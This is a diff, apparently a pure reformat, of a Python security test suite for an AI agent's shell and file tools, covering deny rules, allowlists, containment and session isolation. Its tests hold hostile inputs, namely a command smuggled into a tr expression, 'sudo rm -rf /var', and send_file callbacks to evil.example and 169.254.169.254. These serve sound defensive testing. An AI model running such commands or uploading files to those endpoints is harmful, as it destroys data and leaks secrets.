@@ -136,7 +136,9 @@ class TestTransformTextSecurity:
 
     def test_normal_sed(self):
         result = json.loads(
-            transform_text(input_text="hello world", operation="sed", expression="s/hello/goodbye/g")
+            transform_text(
+                input_text="hello world", operation="sed", expression="s/hello/goodbye/g"
+            )
         )
         assert result["status"] == "success"
         assert "goodbye" in result["output"]
@@ -174,9 +176,7 @@ class TestTransformTextSecurity:
     def test_tr_injection(self, tmp_path):
         marker = tmp_path / "pwned_tr"
         malicious = f"a-z A-Z; touch {marker}"
-        result = json.loads(
-            transform_text(input_text="test", operation="tr", expression=malicious)
-        )
+        result = json.loads(transform_text(input_text="test", operation="tr", expression=malicious))
         assert not marker.exists(), "Shell injection via tr expression succeeded"
 
     def test_file_path_with_spaces(self, tmp_path):
@@ -184,8 +184,10 @@ class TestTransformTextSecurity:
         test_file.write_text("hello world\n")
         result = json.loads(
             transform_text(
-                input_text=str(test_file), operation="sed",
-                expression="s/hello/goodbye/g", is_file=True
+                input_text=str(test_file),
+                operation="sed",
+                expression="s/hello/goodbye/g",
+                is_file=True,
             )
         )
         assert result["status"] == "success"
@@ -440,18 +442,22 @@ class TestPermissionRules:
 
     def test_wrapper_word_does_not_bypass_deny(self, settings_file):
         settings_file({"deny": ["Bash(pip install*)"]})
-        for cmd in ("nohup pip install requests",
-                    "command pip install requests",
-                    "time pip install requests"):
+        for cmd in (
+            "nohup pip install requests",
+            "command pip install requests",
+            "time pip install requests",
+        ):
             result = _validate_bash_command(cmd)
             assert result is not None and "deny rule" in result, cmd
 
     def test_python_m_pip_glob_rule(self, settings_file):
         settings_file({"deny": ["Bash(*-m pip install*)"]})
-        for cmd in ("python -m pip install requests",
-                    "python3 -m pip install requests",
-                    "/opt/miniconda3/bin/python3.13 -m pip install requests",
-                    "echo hi && python -m pip install requests"):
+        for cmd in (
+            "python -m pip install requests",
+            "python3 -m pip install requests",
+            "/opt/miniconda3/bin/python3.13 -m pip install requests",
+            "echo hi && python -m pip install requests",
+        ):
             result = _validate_bash_command(cmd)
             assert result is not None and "deny rule" in result, cmd
         assert _validate_bash_command("python -m pipdeptree") is None
@@ -462,8 +468,14 @@ class TestPermissionRules:
 
     def test_serve_start_honors_deny_rules(self, settings_file, tmp_path):
         settings_file({"deny": ["Bash(pip install*)"]})
-        result = json.loads(bash_mod.serve(action="start", command="pip install requests",
-                                           name="pytest-denied", cwd=str(tmp_path)))
+        result = json.loads(
+            bash_mod.serve(
+                action="start",
+                command="pip install requests",
+                name="pytest-denied",
+                cwd=str(tmp_path),
+            )
+        )
         assert result["status"] == "blocked"
         assert "deny rule" in result["error"]
 
@@ -476,8 +488,7 @@ class TestSettingsRulesUIGating:
     def default_settings(self, tmp_path, monkeypatch):
         """A deny rule living at the DEFAULT settings path (no explicit override)."""
         path = tmp_path / "settings.json"
-        path.write_text(json.dumps(
-            {"permissions": {"deny": ["Bash(pip install*)"]}}))
+        path.write_text(json.dumps({"permissions": {"deny": ["Bash(pip install*)"]}}))
         monkeypatch.delenv("ONIT_SETTINGS", raising=False)
         monkeypatch.delenv("ONIT_WEB_UI", raising=False)
         monkeypatch.setattr(bash_mod, "SETTINGS_PATH", None)
@@ -493,14 +504,12 @@ class TestSettingsRulesUIGating:
         result = _validate_bash_command("pip install requests")
         assert result is not None and "deny rule" in result
 
-    def test_explicit_onit_settings_enforces_in_text_ui(self, default_settings,
-                                                        monkeypatch):
+    def test_explicit_onit_settings_enforces_in_text_ui(self, default_settings, monkeypatch):
         monkeypatch.setenv("ONIT_SETTINGS", str(default_settings))
         result = _validate_bash_command("pip install requests")
         assert result is not None and "deny rule" in result
 
-    def test_explicit_settings_path_enforces_in_text_ui(self, default_settings,
-                                                        monkeypatch):
+    def test_explicit_settings_path_enforces_in_text_ui(self, default_settings, monkeypatch):
         monkeypatch.setattr(bash_mod, "SETTINGS_PATH", str(default_settings))
         result = _validate_bash_command("pip install requests")
         assert result is not None and "deny rule" in result
@@ -508,8 +517,7 @@ class TestSettingsRulesUIGating:
     def test_text_ui_ignores_default_allowed_commands(self, tmp_path, monkeypatch):
         """allowedCommands extras from the default file are also web-UI-only."""
         path = tmp_path / "settings.json"
-        path.write_text(json.dumps(
-            {"permissions": {"allowedCommands": ["mytool"]}}))
+        path.write_text(json.dumps({"permissions": {"allowedCommands": ["mytool"]}}))
         monkeypatch.delenv("ONIT_SETTINGS", raising=False)
         monkeypatch.setattr(bash_mod, "SETTINGS_PATH", None)
         monkeypatch.setattr(bash_mod, "DEFAULT_SETTINGS_PATH", str(path))
@@ -590,8 +598,7 @@ class TestCommandAllowlist:
 
     def test_pinned_install_with_optin(self, enforced, monkeypatch):
         monkeypatch.setenv("ONIT_ALLOW_PACKAGE_INSTALL", "1")
-        assert bash_mod._validate_bash_command(
-            "pip install requests==2.31.0") is None
+        assert bash_mod._validate_bash_command("pip install requests==2.31.0") is None
         err = bash_mod._validate_bash_command("pip install requests")
         assert err is not None and "not version-pinned" in err
 
@@ -609,27 +616,30 @@ class TestCommandAllowlist:
         monkeypatch.setenv("ONIT_ALLOW_PACKAGE_INSTALL", "1")
         assert bash_mod._validate_bash_command("onit-install-ml torch") is None
 
-    @pytest.mark.parametrize("cmd", [
-        "pip install requests==2.31.0",
-        "python -m pip install requests==2.31.0",
-        "uv pip install requests==2.31.0",
-        "uv add requests==2.31.0",
-        "pipx install black==24.1.0",
-        "npm install left-pad@1.3.0",
-        "yarn add left-pad@1.3.0",
-        "npx cowsay@1.5.0",
-        "gem install rake",
-    ])
+    @pytest.mark.parametrize(
+        "cmd",
+        [
+            "pip install requests==2.31.0",
+            "python -m pip install requests==2.31.0",
+            "uv pip install requests==2.31.0",
+            "uv add requests==2.31.0",
+            "pipx install black==24.1.0",
+            "npm install left-pad@1.3.0",
+            "yarn add left-pad@1.3.0",
+            "npx cowsay@1.5.0",
+            "gem install rake",
+        ],
+    )
     def test_sealed_web_refuses_installs(self, sealed_web, cmd):
         """The seal blocks installs even with the opt-in set."""
         err = bash_mod._validate_bash_command(cmd)
         assert err is not None, f"sealed web should refuse: {cmd}"
         assert "web UI mode" in err, f"wrong refusal reason for {cmd}: {err}"
 
-    @pytest.mark.parametrize("cmd", ["apt-get install curl=8.5.0",
-                                     "dnf install curl", "apk add curl"])
-    def test_system_pkg_managers_refused_when_sealed(self, sealed_web,
-                                                     monkeypatch, cmd):
+    @pytest.mark.parametrize(
+        "cmd", ["apt-get install curl=8.5.0", "dnf install curl", "apk add curl"]
+    )
+    def test_system_pkg_managers_refused_when_sealed(self, sealed_web, monkeypatch, cmd):
         """System package managers stay blocked when sealed.
 
         These are refused by an earlier layer than the seal (apt is rejected
@@ -658,8 +668,7 @@ class TestCommandAllowlist:
         developer's machine must not lose pip.
         """
         monkeypatch.delenv("ONIT_CONTAINER", raising=False)
-        assert bash_mod._validate_bash_command(
-            "pip install requests==2.31.0") is None
+        assert bash_mod._validate_bash_command("pip install requests==2.31.0") is None
 
         monkeypatch.delenv("ONIT_ALLOW_PACKAGE_INSTALL", raising=False)
         err = bash_mod._validate_bash_command("pip install requests==2.31.0")
@@ -669,8 +678,7 @@ class TestCommandAllowlist:
     def test_container_terminal_keeps_the_optin(self, sealed_web, monkeypatch):
         """Container without the web UI is terminal/loop — opt-in intact."""
         monkeypatch.delenv("ONIT_WEB_UI", raising=False)
-        assert bash_mod._validate_bash_command(
-            "pip install requests==2.31.0") is None
+        assert bash_mod._validate_bash_command("pip install requests==2.31.0") is None
         assert bash_mod._validate_bash_command("onit-install-ml torch") is None
 
     def test_sealed_web_allows_non_install_commands(self, sealed_web):
@@ -681,9 +689,14 @@ class TestCommandAllowlist:
         assert bash_mod._validate_bash_command("git status") is None
 
     def test_serve_start_honors_allowlist(self, enforced, tmp_path):
-        result = json.loads(bash_mod.serve(
-            action="start", command="evilserver --port 8080",
-            name="pytest-allowlist", cwd=str(tmp_path)))
+        result = json.loads(
+            bash_mod.serve(
+                action="start",
+                command="evilserver --port 8080",
+                name="pytest-allowlist",
+                cwd=str(tmp_path),
+            )
+        )
         assert result["status"] == "blocked"
         assert "allowlist" in result["error"]
 
@@ -720,8 +733,7 @@ class TestAutoContainment:
         monkeypatch.setenv("ONIT_CONTAIN_THRESHOLD", "5")
         monkeypatch.setattr(bash_mod, "_CONTAINED", {""})
 
-    async def test_containment_after_threshold(self, enforced, monkeypatch,
-                                               tmp_path, bash_tool):
+    async def test_containment_after_threshold(self, enforced, monkeypatch, tmp_path, bash_tool):
         monkeypatch.setenv("ONIT_CONTAIN_THRESHOLD", "3")
         for _ in range(3):
             r = json.loads(await bash_tool(command="sudo rm -rf /var"))
@@ -731,8 +743,7 @@ class TestAutoContainment:
         assert r["status"] == "contained"
         assert os.path.isfile(bash_mod._containment_marker_path())
 
-    async def test_policy_refusals_never_contain(self, enforced, monkeypatch,
-                                                 tmp_path, bash_tool):
+    async def test_policy_refusals_never_contain(self, enforced, monkeypatch, tmp_path, bash_tool):
         """An unlisted executable is friction, not an attack.
 
         This is the case the old counter got wrong: a session that keeps
@@ -746,9 +757,9 @@ class TestAutoContainment:
         r = json.loads(await bash_tool(command=f"ls {tmp_path}"))
         assert r["status"] in ("success", "failed")
 
-    async def test_violations_decay_out_of_the_window(self, enforced,
-                                                      monkeypatch, tmp_path,
-                                                      bash_tool):
+    async def test_violations_decay_out_of_the_window(
+        self, enforced, monkeypatch, tmp_path, bash_tool
+    ):
         """Two refusals an hour apart are not a burst."""
         monkeypatch.setenv("ONIT_CONTAIN_THRESHOLD", "2")
         monkeypatch.setenv("ONIT_CONTAIN_WINDOW", "0.05")
@@ -758,9 +769,9 @@ class TestAutoContainment:
         r = json.loads(await bash_tool(command=f"ls {tmp_path}"))
         assert r["status"] in ("success", "failed")
 
-    async def test_containment_is_scoped_to_the_session(self, enforced,
-                                                        monkeypatch, tmp_path,
-                                                        bash_tool):
+    async def test_containment_is_scoped_to_the_session(
+        self, enforced, monkeypatch, tmp_path, bash_tool
+    ):
         """One session's lockdown must not strand the next one.
 
         The marker used to live at the data-directory root whatever earned it,
@@ -773,21 +784,23 @@ class TestAutoContainment:
         monkeypatch.setenv("ONIT_CONTAIN_THRESHOLD", "2")
         for _ in range(2):
             await bash_tool(command="sudo rm -rf /var", data_path=str(alice))
-        assert json.loads(await bash_tool(
-            command="ls .", data_path=str(alice)))["status"] == "contained"
-        assert json.loads(await bash_tool(
-            command="ls .", data_path=str(bob)))["status"] in ("success", "failed")
+        assert (
+            json.loads(await bash_tool(command="ls .", data_path=str(alice)))["status"]
+            == "contained"
+        )
+        assert json.loads(await bash_tool(command="ls .", data_path=str(bob)))["status"] in (
+            "success",
+            "failed",
+        )
 
-    async def test_below_threshold_not_contained(self, enforced, monkeypatch,
-                                                 tmp_path, bash_tool):
+    async def test_below_threshold_not_contained(self, enforced, monkeypatch, tmp_path, bash_tool):
         monkeypatch.setenv("ONIT_CONTAIN_THRESHOLD", "3")
         for _ in range(2):
             await bash_tool(command="sudo rm -rf /var")
         r = json.loads(await bash_tool(command=f"ls {tmp_path}"))
         assert r["status"] in ("success", "failed")
 
-    async def test_threshold_zero_disables(self, enforced, monkeypatch,
-                                           tmp_path, bash_tool):
+    async def test_threshold_zero_disables(self, enforced, monkeypatch, tmp_path, bash_tool):
         monkeypatch.setenv("ONIT_CONTAIN_THRESHOLD", "0")
         for _ in range(10):
             await bash_tool(command="sudo rm -rf /var")
@@ -795,8 +808,9 @@ class TestAutoContainment:
         assert r["status"] in ("success", "failed")
 
     @pytest.mark.parametrize("container", ["1", None])
-    async def test_default_disables_containment(self, enforced, monkeypatch,
-                                                tmp_path, bash_tool, container):
+    async def test_default_disables_containment(
+        self, enforced, monkeypatch, tmp_path, bash_tool, container
+    ):
         """Containment is opt-in by default, on the host as well as in the
         container: blocked commands stay blocked but never escalate to a
         lockdown, so an accumulation of rejected paths cannot strand a
@@ -819,7 +833,8 @@ class TestAutoContainment:
         assert bash_mod._is_contained() is False
 
     async def test_container_explicit_threshold_still_contains(
-            self, enforced, monkeypatch, tmp_path, bash_tool):
+        self, enforced, monkeypatch, tmp_path, bash_tool
+    ):
         monkeypatch.setenv("ONIT_CONTAINER", "1")
         monkeypatch.setenv("ONIT_CONTAIN_THRESHOLD", "2")
         for _ in range(2):
@@ -828,21 +843,30 @@ class TestAutoContainment:
         assert r["status"] == "contained"
 
     def test_containment_gates_write_tools(self, contained, tmp_path):
-        write_fn = bash_mod.write_file.fn if hasattr(bash_mod.write_file, "fn") \
-            else bash_mod.write_file
-        edit_fn = bash_mod.edit_file.fn if hasattr(bash_mod.edit_file, "fn") \
-            else bash_mod.edit_file
-        send_fn = bash_mod.send_file.fn if hasattr(bash_mod.send_file, "fn") \
-            else bash_mod.send_file
+        write_fn = (
+            bash_mod.write_file.fn if hasattr(bash_mod.write_file, "fn") else bash_mod.write_file
+        )
+        edit_fn = bash_mod.edit_file.fn if hasattr(bash_mod.edit_file, "fn") else bash_mod.edit_file
+        send_fn = bash_mod.send_file.fn if hasattr(bash_mod.send_file, "fn") else bash_mod.send_file
         assert json.loads(write_fn(path="x.txt", content="hi"))["status"] == "contained"
-        assert json.loads(edit_fn(path="x.txt", old_string="a", new_string="b"))["status"] == "contained"
+        assert (
+            json.loads(edit_fn(path="x.txt", old_string="a", new_string="b"))["status"]
+            == "contained"
+        )
         assert json.loads(send_fn(path="x.txt"))["status"] == "contained"
-        assert json.loads(transform_text(input_text="x", operation="sed",
-                                         expression="s/x/y/"))["status"] == "contained"
+        assert (
+            json.loads(transform_text(input_text="x", operation="sed", expression="s/x/y/"))[
+                "status"
+            ]
+            == "contained"
+        )
 
     def test_containment_gates_serve_start(self, contained, tmp_path):
-        result = json.loads(bash_mod.serve(action="start", command="sleep 60",
-                                           name="pytest-contained", cwd=str(tmp_path)))
+        result = json.loads(
+            bash_mod.serve(
+                action="start", command="sleep 60", name="pytest-contained", cwd=str(tmp_path)
+            )
+        )
         assert result["status"] == "contained"
 
     def test_marker_persists_containment(self, enforced, contained, tmp_path):
@@ -854,8 +878,7 @@ class TestAutoContainment:
     def test_reads_still_work_when_contained(self, tmp_path):
         (tmp_path / "readable.txt").write_text("still visible\n")
         bash_mod._CONTAINED = {""}
-        read_fn = bash_mod.read_file.fn if hasattr(bash_mod.read_file, "fn") \
-            else bash_mod.read_file
+        read_fn = bash_mod.read_file.fn if hasattr(bash_mod.read_file, "fn") else bash_mod.read_file
         result = json.loads(read_fn(path=str(tmp_path / "readable.txt")))
         assert result["status"] == "success"
 
@@ -906,9 +929,7 @@ class TestSessionIsolation:
 
     def test_read_file_tool_blocked_across_sessions(self, sessions):
         a, b = sessions
-        result = json.loads(
-            _fn(bash_mod.read_file)(path=str(b / "secret.txt"), data_path=str(a))
-        )
+        result = json.loads(_fn(bash_mod.read_file)(path=str(b / "secret.txt"), data_path=str(a)))
         assert "content" not in result
         assert "error" in result
 
@@ -925,9 +946,7 @@ class TestSessionIsolation:
 
     def test_find_files_cannot_enumerate_sibling_sessions(self, sessions, tmp_path):
         a, _ = sessions
-        result = json.loads(
-            _fn(bash_mod.find_files)(directory=str(tmp_path), data_path=str(a))
-        )
+        result = json.loads(_fn(bash_mod.find_files)(directory=str(tmp_path), data_path=str(a)))
         assert result["status"] == "error"
 
     def test_search_directory_blocked_across_sessions(self, sessions):
@@ -980,6 +999,7 @@ class TestHarnessInjectionOverwrite:
             async def handler(log_handler=None, **kwargs):
                 self.received = dict(kwargs)
                 return "ok"
+
             return handler
 
     def test_injected_values_overwrite_model_supplied(self):
@@ -987,20 +1007,33 @@ class TestHarnessInjectionOverwrite:
         from src.model.serving.chat import _execute_tool
 
         registry = self._Registry()
-        args = {"path": "x.txt", "data_path": "/tmp/other-users-session",
-                "session_id": "someone-else"}
-        asyncio.run(_execute_tool(
-            "write_file", args, "call-1", registry,
-            timeout=5, data_path="/tmp/trusted-session",
-            chat_ui=None, verbose=False, messages=[],
-            tool_call_history=[], max_repeated=5,
-            session_id="trusted-session",
-        ))
+        args = {
+            "path": "x.txt",
+            "data_path": "/tmp/other-users-session",
+            "session_id": "someone-else",
+        }
+        asyncio.run(
+            _execute_tool(
+                "write_file",
+                args,
+                "call-1",
+                registry,
+                timeout=5,
+                data_path="/tmp/trusted-session",
+                chat_ui=None,
+                verbose=False,
+                messages=[],
+                tool_call_history=[],
+                max_repeated=5,
+                session_id="trusted-session",
+            )
+        )
         assert registry.received["data_path"] == "/tmp/trusted-session"
         assert registry.received["session_id"] == "trusted-session"
 
 
 # ─── S4: send_file destination restriction ───────────────────────────────────
+
 
 class TestSendFileDestination:
     """callback_url is an exfiltration channel when unrestricted: one injected
@@ -1015,8 +1048,9 @@ class TestSendFileDestination:
         p = tmp_path / "f.txt"
         p.write_text("secret")
         monkeypatch.setattr(bash_mod, "FILE_SERVER_URL", "")
-        out = json.loads(f(path=str(p), callback_url="http://evil.example/upload",
-                           data_path=str(tmp_path)))
+        out = json.loads(
+            f(path=str(p), callback_url="http://evil.example/upload", data_path=str(tmp_path))
+        )
         assert out["status"] == "refused"
         assert "evil.example" not in out.get("download_url", "")
 
@@ -1025,8 +1059,9 @@ class TestSendFileDestination:
         p = tmp_path / "f.txt"
         p.write_text("secret")
         monkeypatch.setattr(bash_mod, "FILE_SERVER_URL", "http://10.0.0.5:9000")
-        out = json.loads(f(path=str(p), callback_url="http://evil.example/upload",
-                           data_path=str(tmp_path)))
+        out = json.loads(
+            f(path=str(p), callback_url="http://evil.example/upload", data_path=str(tmp_path))
+        )
         assert out["status"] == "refused"
 
     def test_callback_allowed_for_file_server(self, tmp_path, monkeypatch):
@@ -1052,8 +1087,13 @@ class TestSendFileDestination:
             return _Resp()
 
         monkeypatch.setattr(bash_mod, "safe_fetch", _fake_post)
-        out = json.loads(f(path=str(p), callback_url="http://files.local:9000/uploads/s1",
-                           data_path=str(tmp_path)))
+        out = json.loads(
+            f(
+                path=str(p),
+                callback_url="http://files.local:9000/uploads/s1",
+                data_path=str(tmp_path),
+            )
+        )
         assert out["status"] == "uploaded", out
         assert posted["url"] == "http://files.local:9000/uploads/s1/"
 
@@ -1063,14 +1103,19 @@ class TestSendFileDestination:
         f = self._fn(bash_mod.send_file)
         p = tmp_path / "f.txt"
         p.write_text("mine")
-        monkeypatch.setattr(bash_mod, "FILE_SERVER_URL",
-                            "http://169.254.169.254:9000")
-        out = json.loads(f(path=str(p), callback_url="http://169.254.169.254:9000/uploads/s1",
-                           data_path=str(tmp_path)))
+        monkeypatch.setattr(bash_mod, "FILE_SERVER_URL", "http://169.254.169.254:9000")
+        out = json.loads(
+            f(
+                path=str(p),
+                callback_url="http://169.254.169.254:9000/uploads/s1",
+                data_path=str(tmp_path),
+            )
+        )
         assert out["status"] == "refused"
 
 
 # ─── S5: askpass token not at rest ───────────────────────────────────────────
+
 
 class TestAskpassToken:
     """The askpass script used to embed the GitHub token verbatim, leaving it
